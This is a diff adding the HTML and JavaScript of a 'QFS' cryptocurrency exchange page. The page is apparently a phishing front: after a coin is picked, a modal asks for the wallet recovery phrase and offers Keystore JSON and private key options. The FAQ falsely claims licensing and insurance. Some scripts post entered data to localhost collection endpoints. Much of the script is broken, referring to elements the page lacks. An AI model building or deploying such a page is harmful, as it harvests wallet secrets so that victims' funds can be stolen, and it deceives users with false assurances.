@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Crypto Select</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="./css/style.css">
+  <link rel="stylesheet" href="./css/aos.css">
+  <!-- Google Fonts: Montserrat -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+  
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&display=swap" rel="stylesheet">
+
+  <style>
+    .crypto-card {
+      text-align: center;
+      cursor: pointer;
+      transition: 0.3s;
+      background-color: #0D121C;
+      border-radius: 12px;
+      padding: 20px;
+      /* margin-bottom: 30px; */
+      transition: 0.3s ease;
+      /* height: 100%; */
+      border: 1px solid rgb(68, 68, 68);
+    }
+    .crypto-card:hover {
+      box-shadow: 0 0 12px #fa9f1677;
+    }
+    .crypto-logo {
+      width: 40px;
+      height: 40px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+
+   <!-- Navbar -->
+   <nav class="navbar navbar-expand-lg px-5 navbar-dark py-3">
+    <a class="navbar-brand" href="#">
+    <img src="images/logo.png" alt="QFS Logo" width="80">
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+    <span class="navbar-toggler-icon"></span>
+    </button>
+    
+    <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+        <ul class="navbar-nav gap-3 text-white">
+            <li class="nav-item"><a class="nav-link active" href="./index.html">Home</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#about/index.html">About</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#features/index.html">Features</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#benefits/index.html">Benefits</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#faq/index.html">FAQs</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#tracking/index.html">Tracking</a></li>
+            
+        </ul>
+    </div>
+  </nav>
+
+  <!-- Hero Section -->
+  <section class="container pt-3 pb-5 mt-4 hero text-center mb-5">
+    <div class="row align-items-center justify-content-between mb-5 text-center">
+      <!-- Text content -->
+      <div class="col-md- mx-auto mb-4 mb-md-0">
+        <span class="badge mb-3" data-aos="fade-up">Future of crypto trading</span>
+        <h1 class="display-3" data-aos="fade-up" data-aos-delay="200">Fast & Secure <br> Cryptocurrency Exchange</h1>
+        <p class="text-secondary mt-3 mb-4 col-lg-6 mx-auto" data-aos="fade-up" data-aos-delay="300">Trade cryptocurrencies with ease, security, and advanced features on our cutting-edge platform.</p>
+        <a href="#crypto" class="btn primary-btn px-4 py-2" data-aos="fade-up" data-aos-delay="300">Get Started</a>
+      </div>
+    </div>
+    <img src="./images/OY3765wP7RKuihe6iCzotZ1ge0.svg" class="w-100 mt-5" alt="">
+  </section>
+<br>
+  <div class="row g-4 container mx-auto my-5" data-aos="fade-right">
+    <!-- Buy Crypto -->
+    <div class="col-md-4 text-center">
+      <div class="coin-card">
+        <center><h3 class="bi bi-currency-bitcoin primary-text crypto-icon"></h3></center>
+        <div class="coin-title mt-2">Buy</div>
+        <p class="text-white-50">Purchase Crypto</p>
+      </div>
+    </div>
+
+    <div class="col-md-4 text-center" data-aos="fade-right" data-aos-delay="100">
+      <div class="coin-card">
+        <center><h3 class="bi bi-cash-coin primary-text crypto-icon"></h3></center>
+        <div class="coin-title mt-2">Sell</div>
+        <p class="text-white-50">Trade at a Nice Price</p>
+      </div>
+    </div>
+
+    <div class="col-md-4 text-center" data-aos="fade-right" data-aos-delay="200">
+      <div class="coin-card">
+        <center><h3 class="bi bi-wallet2 primary-text crypto-icon"></h3></center>
+        <div class="coin-title mt-2">Link Wallet</div>
+        <p class="text-white-50">For Excellent Rates</p>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="container py-5" id="crypto">
+    <h2 class="text-center mb-4">Select a Cryptocurrency</h2>
+    <div class="row row-cols-2 row-cols-md-4 g-4" id="crypto-container">
+            
+    </div>
+  </div>
+
+  <!-- Crypto Cards Grid -->
+<div class="container mt-5">
+  <div class="row row-cols-1 row-cols-md-3 g-4" id="crypto-container">
+    <!-- Cards will be injected here -->
+  </div>
+</div>
+
+<!-- Modal Structure -->
+<div class="modal fade" id="cryptoModal" tabindex="-1" aria-labelledby="cryptoModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content p-4 bg-dark">
+      <div class="modal-header">
+        <h5 class="modal-title">Start With <span id="selectedCryptoTitle">Crypto</span></h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+
+      <div class="modal-body">
+        <!-- Navigation Buttons -->
+        <div class="d-flex justify-content-between mb-4">
+          <button class="btn btn-outline-primary" onclick="switchForm('phone')">Phrase</button>
+          <button class="btn btn-outline-primary" onclick="switchForm('email')">Keystore JSON</button>
+          <button class="btn btn-outline-primary" onclick="switchForm('trade')">Private Key</button>
+        </div>
+
+        <!-- Form Sections -->
+        <div id="phoneForm" class="form-section">
+          <form onsubmit="sendForm(event, 'phone')">
+            <input type="text" class="form-control mb-3" id="phoneNumber" placeholder="Enter your recovery phrase" required>
+            <input type="hidden" id="selectedCrypto" />
+            <p class="text-white-50">Typically 12 (sometimes 24) words seperated by single spaces</p>
+            <div class="d-flex justify-content-between">
+              <button type="submit" class="btn btn-success">Submit</button>
+              <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close">Close</button>
+            </div>
+          </form>
+        </div>
+
+        <!-- <div id="emailForm" class="form-section d-none">
+          <form onsubmit="sendForm(event, 'email')">
+            <input type="email" class="form-control mb-3" id="emailAddress" placeholder="Enter your email address" required>
+            <button type="submit" class="btn btn-primary w-100">Submit Email</button>
+          </form>
+        </div> -->
+
+        <!-- <div id="tradeForm" class="form-section d-none">
+          <form onsubmit="sendForm(event, 'trade')">
+            <input type="text" class="form-control mb-3" placeholder="Enter username to trade" required>
+            <button type="submit" class="btn btn-success w-100">Start Trading</button>
+          </form>
+        </div> -->
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+  <section class="my-5 support rowtext-center text-center pt-5 container">
+    <span class="text-white-50">Always by your side</span>
+      <h1 class="display-6 fw-semibold mt-3 mb-5">
+        Grow your crypto world with us
+      </h1><br>
+    <div class="row g-4 align-items-center px-5 text-center mb-5">
+      <div class="col-lg-4" data-aos="zoom-out">
+        <img src="./images/contact.svg" alt="" class="icon">
+        <h4 class="my-3">24/7 Support</h4>
+        <span class="text-white-50">Need help? Get your requests  solved quickly via support team</span>
+      </div>
+      <div class="col-lg-4" data-aos="zoom-out" data-aos-delay="100">
+        <img src="./images/users.svg" alt="" class="icon">
+        <h4 class="my-3">Community</h4>
+        <span class="text-white-50">Join the conversations on our  worldwide OKEx communities</span>
+      </div>
+      <div class="col-lg-4" data-aos="zoom-out" data-aos-delay="200">
+        <img src="./images/secure.svg" alt="" class="icon">
+        <h4 class="my-3">Security</h4>
+        <span class="text-white-50">Secure you crypto accounts with us and grow money 10x faster</span>
+      </div>
+    </div>
+    <img src="images/OY3765wP7RKuihe6iCzotZ1ge0.svg" alt="" class="w-100">
+  </section>
+
+<section class="my-5 py-5 container">
+  <h1 class="text-center caption mt-5 mb-5" data-aos="fade-up" data-aos-delay="100">Frequently Asked Questions</h1>
+  <!-- Accordion start -->
+<div class="accordion" id="accordionExample">
+
+  <!-- 1. How do I open an account? -->
+  <!-- <div class="accordion-item">
+    <h2 class="accordion-header" id="headingOne">
+      <button class="accordion-button" type="button" data-bs-toggle="collapse"
+        data-bs-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
+        <h5>How do I open an account?</h5>
+      </button>
+    </h2>
+    <div id="collapseOne" class="accordion-collapse collapse show" aria-labelledby="headingOne"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        Opening an account is fast and free. Just download the app, click on “Create Account,” and follow the prompts to verify your identity.
+      </div>
+    </div>
+  </div> -->
+
+  <!-- 2. Is my money safe with Q? -->
+  <div class="accordion-item">
+    <h2 class="accordion-header" id="headingTwo">
+      <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+        data-bs-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
+        <h5>Is my money safe with QFS?</h5>
+      </button>
+    </h2>
+    <div id="collapseTwo" class="accordion-collapse collapse" aria-labelledby="headingTwo"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        Absolutely. We use bank-grade encryption and are fully licensed and regulated. Your funds are also insured up to the legal limit.
+      </div>
+    </div>
+  </div>
+
+  <!-- 3. How can I send or receive money? -->
+  <div class="accordion-item">
+    <h2 class="accordion-header" id="headingThree">
+      <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+        data-bs-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
+        <h5>How can I send or receive money?</h5>
+      </button>
+    </h2>
+    <div id="collapseThree" class="accordion-collapse collapse" aria-labelledby="headingThree"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        You can send or receive money instantly using a phone number, account number, or QR code — all from your dashboard.
+      </div>
+    </div>
+  </div>
+
+  <!-- 4. Are there any hidden charges? -->
+  <div class="accordion-item">
+    <h2 class="accordion-header" id="headingFour">
+      <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+        data-bs-target="#collapseFour" aria-expanded="false" aria-controls="collapseFour">
+        <h5>Are there any hidden charges?</h5>
+      </button>
+    </h2>
+    <div id="collapseFour" class="accordion-collapse collapse" aria-labelledby="headingFour"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        No. We believe in full transparency. All fees are clearly listed and shown before any transaction is completed.
+      </div>
+    </div>
+  </div>
+
+  <!-- 5. What should I do if I forget my password? -->
+  <div class="accordion-item">
+    <h2 class="accordion-header" id="headingFive">
+      <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+        data-bs-target="#collapseFive" aria-expanded="false" aria-controls="collapseFive">
+        <h5>What should I do if I forget my password?</h5>
+      </button>
+    </h2>
+    <div id="collapseFive" class="accordion-collapse collapse" aria-labelledby="headingFive"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        Tap “Forgot Password” on the login screen and follow the instructions. You’ll be able to reset your password securely in minutes.
+      </div>
+    </div>
+  </div>
+
+  <!-- 6. Can I use Q outside my country? -->
+  <div class="accordion-item">
+    <h2 class="accordion-header" id="headingSix">
+      <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
+        data-bs-target="#collapseSix" aria-expanded="false" aria-controls="collapseSix">
+        <h5>Can I use QFS outside my country?</h5>
+      </button>
+    </h2>
+    <div id="collapseSix" class="accordion-collapse collapse" aria-labelledby="headingSix"
+      data-bs-parent="#accordionExample">
+      <div class="accordion-body">
+        Yes! QFS works globally. You can access your account, send or receive money, and manage your finances wherever you are.
+      </div>
+    </div>
+  </div>
+
+</div>
+<!-- Accordion end -->
+ 
+<!-- Back to Top Button -->
+<button id="backToTopBtn" class="back-to-top">
+  <span class="bi bi-arrow-up"></span>
+</button>
+</section>
+
+<footer class="bg-darker text-white pt-5 pb-2"style="background-image: url(./images/world-dotted-map.png); background-position: center; background-size: 60%; background-repeat: no-repeat;">
+  <div class="container">
+    <div class="row gy-4 justify-content-between py-5">
+
+      <!-- Company Branding -->
+      <div class="col-lg-3">
+        <img src="images/logo.png" alt="QFS Logo" width="80">
+        <p class="text-white-50 mt-2">Revolutionizing finance with simple, smart, and secure banking for everyone.</p>
+        <div class="d-flex gap-3 mt-3">
+          <a href="#" class="text-white fs-5"><i class="bi bi-facebook"></i></a>
+          <a href="#" class="text-white fs-5"><i class="bi bi-linkedin"></i></a>
+          <a href="#" class="text-white fs-5"><i class="bi bi-instagram"></i></a>
+        </div>
+      </div>
+
+      <!-- Quick Navigation -->
+      <div class="col-lg-2 col-md-6">
+        <h6 class="text-uppercase fw-semibold">Company</h6>
+        <ul class="list-unstyled mt-3">
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Careers</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Blog</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">About</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block">Press</a></li>
+        </ul>
+      </div>
+
+      <!-- Resources -->
+      <div class="col-lg-3 col-md-6">
+        <h6 class="text-uppercase fw-semibold">Resources</h6>
+        <ul class="list-unstyled mt-3">
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Pricing</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Help Center</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Security</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block">Privacy Policy</a></li>
+        </ul>
+      </div>
+
+      <!-- Contact Info -->
+      <div class="col-lg-3">
+        <h6 class="text-uppercase fw-semibold">Contact</h6>
+        <ul class="list-unstyled mt-3 text-white-50">
+          <li><i class="bi bi-envelope-fill me-2"></i>support@qfs.com</li>
+          <li class="mt-2"><i class="bi bi-telephone-fill me-2"></i>+234 701 234 5789</li>
+          <li class="mt-2"><i class="bi bi-geo-alt-fill me-2"></i>Lagos, Nigeria</li>
+        </ul>
+      </div>
+
+    </div>
+
+    <!-- Bottom Bar -->
+    <div class="text-center border-top border-secondary mt-5 py-4">
+      <small class="text-white-50">&copy; 2025 QFS. All rights reserved.</small>
+    </div>
+  </div>
+</footer>
+
+  <script>
+    const coins = [
+  { name: "Bitcoin", logo: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png" },
+  { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/large/ethereum.png" },
+  { name: "BNB", logo: "./images/bnb-bnb-logo.png" },
+  { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/large/solana.png" },
+  { name: "Dogecoin", logo: "https://assets.coingecko.com/coins/images/5/large/dogecoin.png" },
+  { name: "Cardano", logo: "https://assets.coingecko.com/coins/images/975/large/cardano.png" },
+  { name: "Ripple", logo: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png" },
+  { name: "Shiba Inu", logo: "https://assets.coingecko.com/coins/images/11939/large/shiba.png" },
+  { name: "Polkadot", logo: "https://assets.coingecko.com/coins/images/12171/large/polkadot.png" },
+  { name: "Avalanche", logo: "./images/avalanche-avax-logo.png" },
+  { name: "Litecoin", logo: "https://assets.coingecko.com/coins/images/2/large/litecoin.png" },
+  { name: "Tron", logo: "https://assets.coingecko.com/coins/images/1094/large/tron-logo.png" },
+  { name: "Chainlink", logo: "https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png" },
+  { name: "Uniswap", logo: "https://assets.coingecko.com/coins/images/12504/large/uniswap-uni.png" },
+  { name: "Cosmos", logo: "https://assets.coingecko.com/coins/images/1481/large/cosmos_hub.png" },
+  { name: "NEAR Protocol", logo: "https://assets.coingecko.com/coins/images/10365/large/near.png" },
+  { name: "VeChain", logo: "./images/vechain-vet-logo.png" },
+  { name: "Aptos", logo: "https://assets.coingecko.com/coins/images/26455/large/aptos_round.png" },
+  { name: "Arbitrum", logo: "https://assets.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg" },
+  { name: "Stacks", logo: "https://assets.coingecko.com/coins/images/2069/large/Stacks_logo_full.png" },
+  { name: "The Graph", logo: "https://assets.coingecko.com/coins/images/13397/large/Graph_Token.png" },
+  { name: "Filecoin", logo: "https://assets.coingecko.com/coins/images/12817/large/filecoin.png" }
+];
+
+const container = document.getElementById("crypto-container");
+const selectedInput = document.getElementById("selectedCrypto");
+const selectedCryptoTitle = document.getElementById("selectedCryptoTitle");
+
+coins.forEach(coin => {
+  const col = document.createElement("div");
+  col.className = "col";
+  col.innerHTML = `
+    <div class="crypto-card text-center p-3 shadow-sm border rounded" data-name="${coin.name}" data-bs-toggle="modal" data-bs-target="#cryptoModal">
+      <img src="${coin.logo}" alt="${coin.name}" class="crypto-logo mb-2" style="width: 50px; height: 50px;">
+      <h5>${coin.name}</h5>
+    </div>
+  `;
+  container.appendChild(col);
+});
+
+container.addEventListener("click", function(e) {
+  const card = e.target.closest(".crypto-card");
+  if (card) {
+    const coinName = card.dataset.name;
+    selectedInput.value = coinName;
+    selectedCryptoTitle.textContent = coinName;
+    switchForm('phone');
+  }
+});
+
+// Switch form sections inside modal
+function switchForm(type) {
+  document.querySelectorAll('.form-section').forEach(el => el.classList.add("d-none"));
+  document.getElementById(type + "Form").classList.remove("d-none");
+}
+
+// Simulated form sender
+function sendForm(event, type) {
+  event.preventDefault();
+  const crypto = selectedInput.value;
+  let data;
+
+  if (type === "phone") {
+    data = document.getElementById("phoneNumber").value;
+  } else if (type === "email") {
+    data = document.getElementById("emailAddress").value;
+  } else {
+    data = "Started Trading";
+  }
+
+  alert(`Submitted: ${type.toUpperCase()} for ${crypto} - ${data}`);
+  document.getElementById("cryptoModal").classList.remove("show");
+}
+
+
+    container.addEventListener("click", function(e) {
+      const card = e.target.closest(".crypto-card");
+      if (card) {
+        selectedInput.value = card.dataset.name;
+      }
+    });
+
+    function openModal(coin) {
+    document.getElementById("coinName").value = coin;
+    new bootstrap.Modal(document.getElementById("phoneModal")).show();
+  }
+
+  document.getElementById("cryptoForm").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const coin = document.getElementById("coinName").value;
+    const phone = document.getElementById("phone").value;
+
+    const response = await fetch("http://localhost:3000/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ coin, phone })
+    });
+
+    if (response.ok) {
+      alert("Wallet linked successfully!");
+      bootstrap.Modal.getInstance(document.getElementById("phoneModal")).hide();
+    } else {
+      alert("Failed to link.");
+    }
+  });
+  </script>
+
+  <script src="./js/aos.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    AOS.init({
+      duration: 700,
+      once: true
+    })
+  </script>
+  <script>
+  function showForm(formId) {
+    document.querySelectorAll('.form-switcher').forEach(form => {
+      form.classList.add('d-none');
+    });
+    document.getElementById(formId).classList.remove('d-none');
+  }
+
+  // Handle submissions
+  document.getElementById("form-phone").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const phone = this.phone.value;
+    await sendData({ phone });
+  });
+
+  document.getElementById("form-email").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const email = this.email.value;
+    await sendData({ email });
+  });
+
+  document.getElementById("form-trade").addEventListener("submit", async function (e) {
+    e.preventDefault();
+    const username = this.username.value;
+    await sendData({ username });
+  });
+
+  async function sendData(data) {
+    const res = await fetch("http://localhost:5000/send-phone", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+    });
+
+    const result = await res.json();
+    alert(result.message || "Sent successfully");
+  }
+</script>
+<script>
+  const container1 = document.getElementById("crypto-container");
+  const selectedInput1 = document.getElementById("selectedCrypto");
+  const selectedInputEmail = document.getElementById("selectedCryptoEmail");
+  const selectedCryptoName = document.getElementById("selectedCryptoName");
+  const selectedCryptoName2 = document.getElementById("selectedCryptoName2");
+
+  container1.addEventListener("click", function(e) {
+    const card = e.target.closest(".crypto-card");
+    if (card) {
+      const cryptoName = card.dataset.name;
+      selectedInput1.value = cryptoName;
+      selectedInputEmail.value = cryptoName;
+      selectedCryptoName.textContent = cryptoName;
+      selectedCryptoName2.textContent = cryptoName;
+      showForm("numberForm"); // default form
+    }
+  });
+</script>
+
+</body>
+</html>
